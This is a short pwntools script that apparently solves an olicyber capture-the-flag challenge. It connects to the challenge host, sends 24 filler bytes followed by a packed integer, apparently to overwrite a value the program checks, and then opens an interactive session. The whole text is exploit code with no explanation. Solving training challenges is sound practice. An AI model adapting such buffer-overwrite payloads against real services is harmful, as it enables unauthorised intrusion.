from pwn import *

r=remote("gtn.challs.olicyber.it",10022)
r.recvline()
r.recvline()
r.sendline(chr(1).encode()*24+p32(281))
r.recvline()
r.sendline(b'281')
r.interactive()